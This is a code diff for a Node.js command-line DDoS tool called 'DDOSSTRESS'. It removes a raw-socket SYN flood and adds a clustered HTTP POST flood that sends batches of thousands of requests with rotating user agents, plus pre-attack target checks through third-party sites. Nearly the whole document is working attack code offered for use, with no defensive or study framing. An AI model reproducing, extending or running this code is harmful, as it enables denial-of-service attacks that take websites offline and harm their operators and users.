@@ -13,9 +13,20 @@ const require = createRequire(import.meta.url);
 let raw;
 try { raw = require("raw-socket"); } catch {}
 
+// Load User Agents
 const userAgents = fs.readFileSync("./useragents.txt", "utf-8")
-                     .split("\n")
-                     .filter(line => line.trim().length > 0);
+  .split("\n")
+  .filter(line => line.trim().length > 0);
+
+// Load Proxies
+const proxies = fs.readFileSync("./proxy.txt", "utf-8")
+  .split("\n")
+  .filter(line => line.trim().length > 0);
+
+// ✅ fungsi randomUA()
+function randomUA() {
+  return userAgents[Math.floor(Math.random() * userAgents.length)] || "Mozilla/5.0";
+}
 
 if (process.argv.length < 7) {
   console.log(chalk.red("Usage: node ddosstress2.js <target> <threads> <duration_sec> --layer <layer4|layer7>"));
@@ -58,18 +69,20 @@ async function checkPort(host, port) {
   });
 }
 
+console.log(chalk.green.bold("=================================================="));
 function printBanner() {
   try {
     console.log(gradient.pastel.multiline(
       figlet.textSync("DDOSSTRESS", { horizontalLayout: "default" })
     ));
   } catch {
+    console.log(chalk.green.bold("=================================================="));
     console.log(chalk.bold("__  __                  __  __          _                 \n" +
-                           "|  \\/  | ___  __ _  __ _|  \\/  | ___  __| |_   _ ___  __ _ \n" +
-                           "| |\\/| |/ _ \\/ _` |/ _` | |\\/| |/ _ \\/ _` | | | / __|/ _` |\n" +
-                           "| |  | |  __/ (_| | (_| | |  | |  __/ (_| | |_| \\__ \\ (_| |\n" +
-                           "|_|  |_|\\___|\\__, |\\__,_|_|  |_|\\___|\\__,_|\\__,_|___/\\__,_|\n" +
-                           "              |___/                                         "));
+      "|  \\/  | ___  __ _  __ _|  \\/  | ___  __| |_   _ ___  __ _ \n" +
+      "| |\\/| |/ _ \\/ _` |/ _` | |\\/| |/ _ \\/ _` | | | / __|/ _` |\n" +
+      "| |  | |  __/ (_| | (_| | |  | |  __/ (_| | |_| \\__ \\ (_| |\n" +
+      "|_|  |_|\\___|\\__, |\\__,_|_|  |_|\\___|\\__,_|\\__,_|___/\\__,_|\n" +
+      "              |___/                                         "));
   }
 
   console.log(chalk.gray(`                              v3.3\n`));
@@ -77,22 +90,27 @@ function printBanner() {
   console.log(chalk.red("-> ") + chalk.yellow("Threads    ") + "🧵 " + chalk.blue(concurrency));
   console.log(chalk.red("-> ") + chalk.yellow("Duration   ") + "⏱ " + chalk.green(durationSec + "s"));
   console.log(chalk.red("-> ") + chalk.yellow("Layer      ") + "🌐 " + chalk.magenta(layerFlag));
-  console.log(chalk.red("------------------------------------------------------------"));
+  console.log(chalk.green.bold("=================================================="));
 }
 
 // --- Master ---
 if (cluster.isPrimary) {
   (async () => {
+    await checkWebsiteStatus(hostname);
+    await checkSifat();
+    await checkValidator(hostname);
+    await checkDownRightNow(hostname);
+    await checkValidatorDetailed(urlObj.href);
+
     const isOpen = await checkPort(hostname, port);
 
     printBanner();
     console.log(chalk.yellow(`Port state : ${isOpen ? chalk.green("OPEN") : chalk.red("CLOSED")}`));
 
-    // Fork workers secara sinkron agar log STARTED berurutan
-    for (let i = 0; i < concurrency; i++) {
+    for (let id = 1; id <= concurrency; id++) {
       await new Promise(resolve => {
         const worker = cluster.fork({
-          WORKER_ID: i + 1,
+          WORKER_ID: id,
           URL: urlObj.href,
           LAYER: layerFlag,
           DURATION: duration
@@ -102,14 +120,14 @@ if (cluster.isPrimary) {
     }
 
     setTimeout(() => {
-      console.log(chalk.red.bold("\n[Master] Time is up, stopping all workers..."));
+      console.log(chalk.red.bold("\n[ DDOSSTRESS ] Time is up, stopping all engines..."));
       for (const id in cluster.workers) cluster.workers[id].kill();
       process.exit(0);
     }, duration);
 
     cluster.on("exit", (worker) => {
       const wid = worker?.process?.env?.WORKER_ID || worker.id;
-      console.log(chalk.yellow(`[DDOSSTRESS] -> Thread ${wid} exited`));
+      console.log(chalk.yellow(`[ DDOSSTRESS ] -> Engine ${wid} exited`));
     });
   })();
 } else {
@@ -117,7 +135,7 @@ if (cluster.isPrimary) {
   const layer = process.env.LAYER;
   const targetUrl = new URL(process.env.URL);
 
-  console.log(chalk.red(`[DDOSSTRESS] -> Thread ${wid} Started`));
+  console.log(chalk.green(`[ DDOSSTRESS ] -> Thread ${wid} Started`));
 
   if (layer === "layer4") {
     mainWorkerLayer4(wid, targetUrl.hostname, targetUrl.port);
@@ -126,87 +144,169 @@ if (cluster.isPrimary) {
   }
 }
 
-// --- Layer 4 ---
-function sendSyn(target, port, socket) {
-  try {
-    const buffer = Buffer.alloc(PACKET_SIZE);
-    buffer.writeUInt16BE(Math.floor(Math.random() * 5148), 10);
-    buffer.writeUInt32BE(Math.floor(Math.random() * 0xffffffff), 4);
-    socket.send(buffer, 0, buffer.length, target, () => {});
-  } catch {}
+// 🔥 fungsi cek status website via isitdown.me
+async function checkWebsiteStatus(domain) {
+  return new Promise((resolve) => {
+    const data = `domain=${encodeURIComponent(domain)}`;
+    const options = {
+      hostname: "isitdown.me",
+      path: "/check_domain.php",
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": Buffer.byteLength(data),
+        "User-Agent": "Mozilla/5.0"
+      }
+    };
+    const req = https.request(options, res => {
+      res.on("end", () => {
+        console.log(chalk.green(`[ DDOSSTRESS ] -> (isitdown.me for ${domain}) (${res.statusCode})`));
+        resolve(res.statusCode);
+      });
+      res.resume();
+    });
+    req.on("error", (err) => {
+      console.log(chalk.red(`[ DDOSSTRESS ] -> (isitdown.me) Error: ${err.code || "ERR"}`));
+      resolve(null);
+    });
+    req.write(data);
+    req.end();
+  });
 }
 
-async function mainWorkerLayer4(workerId, host, port) {
-  let sentBytes = 0, errors = 0;
-  let rawSocket;
-  try {
-    rawSocket = raw.createSocket({ protocol: raw.Protocol.TCP });
-  } catch {
-    console.log(chalk.red("[Error] Raw socket creation failed. Run as root."));
-    process.exit(1);
-  }
-  rawSocket.on("error", () => errors++);
-
-  const startTime = Date.now();
-  const endTime = startTime + duration;
-
-  while (Date.now() < endTime) {
-    for (let i = 0; i < 5000; i++) {
-      sendSyn(host, port, rawSocket);
-      sentBytes += PACKET_SIZE;
-    }
-
-    if ((Date.now() - startTime) % 1000 < 50) {
-      console.log(`[DDOSSTRESS] -> Sent SYN packets: ${Math.floor(sentBytes / PACKET_SIZE)}, Errors: ${errors}`);
-    }
-    await new Promise(r => setImmediate(r));
-  }
-
-  console.log(chalk.cyan(`[Worker #${workerId}] Total SYN packets : ${sentBytes / PACKET_SIZE}`));
-  console.log(chalk.red(`[Worker #${workerId}] Errors            : ${errors}`));
-  rawSocket.close();
-  process.exit(0);
+async function checkSifat() {
+  return new Promise((resolve) => {
+    https.get("https://sifat.org/xmlrpc.php", res => {
+      console.log(chalk.yellow(`[ DDOSSTRESS ] -> (sifat.org/xmlrpc.php) (${res.statusCode})`));
+      res.resume();
+      resolve(res.statusCode);
+    }).on("error", err => {
+      console.log(chalk.red(`[ DDOSSTRESS ] -> (sifat.org/xmlrpc.php) Error: ${err.code || "ERR"}`));
+      resolve(null);
+    });
+  });
 }
 
-// --- Layer 7 ---
+async function checkValidator(domain) {
+  return new Promise((resolve) => {
+    const url = `https://validator.w3.org/checklink?uri=${encodeURIComponent(domain)}`;
+    https.get(url, res => {
+      console.log(chalk.cyan(`[ DDOSSTRESS ] -> (validator.w3.org/checklink) (${res.statusCode})`));
+      res.resume();
+      resolve(res.statusCode);
+    }).on("error", err => {
+      console.log(chalk.red(`[ DDOSSTRESS ] -> (validator.w3.org/checklink) Error: ${err.code || "ERR"}`));
+      resolve(null);
+    });
+  });
+}
+
+async function checkDownRightNow(domain) {
+  return new Promise((resolve) => {
+    const url = `https://www.isitdownrightnow.com/check.php?domain=${encodeURIComponent(domain)}`;
+    https.get(url, res => {
+      console.log(chalk.green(`[ DDOSSTRESS ] -> (isitdownrightnow.com for ${domain}) (${res.statusCode})`));
+      res.resume();
+      resolve(res.statusCode);
+    }).on("error", err => {
+      console.log(chalk.red(`[ DDOSSTRESS ] -> (isitdownrightnow.com) Error: ${err.code || "ERR"}`));
+      resolve(null);
+    });
+  });
+}
+
+async function checkValidatorDetailed(targetUrl) {
+  return new Promise((resolve) => {
+    const url = `https://validator.w3.org/check?uri=${encodeURIComponent(targetUrl)}&charset=%28detect+automatically%29&doctype=Inline&group=0&verbose=1`;
+    https.get(url, res => {
+      console.log(chalk.blue(`[ DDOSSTRESS ] -> (validator.w3.org/check) (${res.statusCode})`));
+      res.resume();
+      resolve(res.statusCode);
+    }).on("error", err => {
+      console.log(chalk.red(`[ DDOSSTRESS ] -> (validator.w3.org/check) Error: ${err.code || "ERR"}`));
+      resolve(null);
+    });
+  });
+}
+
+const errorStats = {};
+function collectError(ip, msg) {
+  const key = `${ip}|${msg}`;
+  errorStats[key] = (errorStats[key] || 0) + 1;
+}
+setInterval(() => {
+  for (const key of Object.keys(errorStats)) {
+    const [ip, msg] = key.split("|");
+    console.log(chalk.red(`[ DDOSSTRESS ] -> (${ip}) Error: ${msg} [x${errorStats[key]}]`));
+  }
+  for (const k in errorStats) delete errorStats[k];
+}, 30000);
+
+// == layer7 === 
+const lastStatus = {};
 async function mainWorkerLayer7(workerId, targetUrl) {
-  let sentRequests = 0, errors = 0;
+  const MAX_REQUESTS = 10000000;
+  const BATCH_SIZE   = 3000;
+  let sentRequests = 0;
   const lib = targetUrl.protocol === "https:" ? https : http;
   const agent = new lib.Agent({ keepAlive: true, maxSockets: 20000 });
+  const host = targetUrl.hostname;
+  const endTime = Date.now() + duration;
 
-  const startTime = Date.now();
-  const endTime = startTime + duration;
+  const payloads = [
+    JSON.stringify({ stress: "ddosstress-engine", ts: Date.now() }),
+    JSON.stringify({ type: "flood", power: "max", worker: workerId }),
+    JSON.stringify({ attack: true, random: Math.random(), uid: Date.now() }),
+    JSON.stringify({ method: "POST", layer: "7", ua: randomUA() }),
+    JSON.stringify({ ping: "pong", thread: workerId, time: new Date().toISOString() }),
+  ];
+  function randomPayload() {
+    return payloads[Math.floor(Math.random() * payloads.length)];
+  }
 
-  while (sentRequests < 5000000 && Date.now() < endTime) {
+  while (sentRequests < MAX_REQUESTS && Date.now() < endTime) {
     const batch = [];
-    const BATCH_SIZE = 900;
-
-    for (let i = 0; i < BATCH_SIZE && sentRequests + i < 5000000; i++) {
-      const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
+    for (let i = 0; i < BATCH_SIZE; i++) {
       batch.push(new Promise(resolve => {
-        const req = lib.get(targetUrl, { agent, headers: { "User-Agent": randomUA } }, res => {
+        const chosenPayload = randomPayload();
+        const options = {
+          method: "POST",
+          agent,
+          headers: {
+            "User-Agent": randomUA(),
+            "Content-Type": "application/json",
+            "Content-Length": Buffer.byteLength(chosenPayload)
+          }
+        };
+        const req = lib.request(targetUrl, options, res => {
+          sentRequests++;
+          const code = res.statusCode;
+          if (lastStatus[host] !== code) {
+            const color = code === 200 ? chalk.green : chalk.red;
+            console.log(color(`[DDOSSTRESS] -> (${host}) (${code})`));
+            lastStatus[host] = code;
+          }
           res.resume();
-          if (Math.random() < 0.05) {
-            console.log(`[DDOSSTRESS] -> (${res.statusCode}) (${targetUrl.href}) /`);
+          resolve();
+        });
+        req.on("error", (err) => {
+          const msg = err.code || "Connection error";
+          if (lastStatus[host] !== msg) {
+            console.log(chalk.red(`[DDOSSTRESS] -> (${host}) ${msg}`));
+            lastStatus[host] = msg;
           }
           resolve();
         });
-        req.on("error", () => { errors++; resolve(); });
+        req.write(chosenPayload);
+        req.end();
       }));
     }
-
     await Promise.all(batch);
-    sentRequests += batch.length;
-
-    if ((Date.now() - startTime) % 1000 < 50) {
-      console.log(`[DDOSSTRESS] -> Sent: ${sentRequests}, Errors: ${errors}`);
-    }
-
-    await new Promise(r => setTimeout(r, 10));
   }
+  if (cluster.isWorker) process.exit(0);
+}
 
-  console.log(chalk.cyan(`[Worker #${workerId}] Total HTTP requests : ${sentRequests}`));
-  console.log(chalk.red(`[Worker #${workerId}] Total errors        : ${errors}`));
-  process.exit(0);
+function mainWorkerLayer4(workerId, host, port) {
+  console.log(chalk.yellow(`[ DDOSSTRESS ] -> Engine ${workerId} running Layer4 on ${host}:${port}`));
 }
 
